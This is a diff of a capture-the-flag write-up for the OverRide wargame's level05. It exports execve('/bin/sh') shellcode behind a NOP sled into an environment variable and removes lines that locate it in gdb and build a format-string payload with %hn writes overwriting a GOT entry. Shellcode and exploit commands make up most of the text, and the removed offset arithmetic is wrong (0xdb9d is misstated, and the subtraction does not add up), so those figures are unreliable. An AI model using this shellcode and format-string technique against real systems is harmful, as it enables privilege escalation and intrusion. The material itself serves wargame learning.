@@ -20,23 +20,6 @@ Second we will create a PAYLOAD env variable and get its address.
 ```
 level05@OverRide:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 ```
-Now we know that we could print the actual address with a c helper program, but the env addresses differ depending of where you run it, so we will use gdb to see the actual stack address value for the PAYLOAD env
-```
-(gdb)x/400s $esp
-0xffffdb9d:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
-0xffffdf21:	 "...\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v̀"
-```
- Write 0xdb9d to 0x80497e0, then 0xffff to 0x80497e2
- Low word:  0xdb9d = 57121 - 8("PAYLOAD=") + 500 = 56713
- High word: 0xffff = 65535 - 56713 = 8822
-
- GOT entry: "\xe0\x97\x04\x08"
- Next block: "\xe2\x97\x04\x08"
-```
-python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56713x" + "%10$hn" + "%8822x" + "%11$hn"' > /tmp/ex
-```
-
-
 ```
 level05@OverRide:/tmp$ cat getenv.c 
 #include <stdio.h>
